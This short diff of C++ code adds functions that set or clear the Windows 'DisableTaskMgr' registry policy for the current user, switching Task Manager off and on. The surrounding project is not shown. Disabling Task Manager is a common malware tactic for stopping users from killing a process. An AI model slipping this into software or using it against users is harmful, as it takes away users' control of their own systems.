@@ -47,4 +47,27 @@ namespace Misc {
 
         fp.close();
     }
+
+    void DisableTaskMgr()
+    {
+        HKEY hKey;
+        RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
+
+        DWORD value = 1;
+        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
+
+        RegCloseKey(hKey);
+    }
+
+    void EnableTaskMgr()
+    {
+        HKEY hKey;
+        RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_ALL_ACCESS, &hKey);
+
+        DWORD value = 0;
+        RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&value, sizeof(value));
+
+        RegCloseKey(hKey);
+    }
+
 }
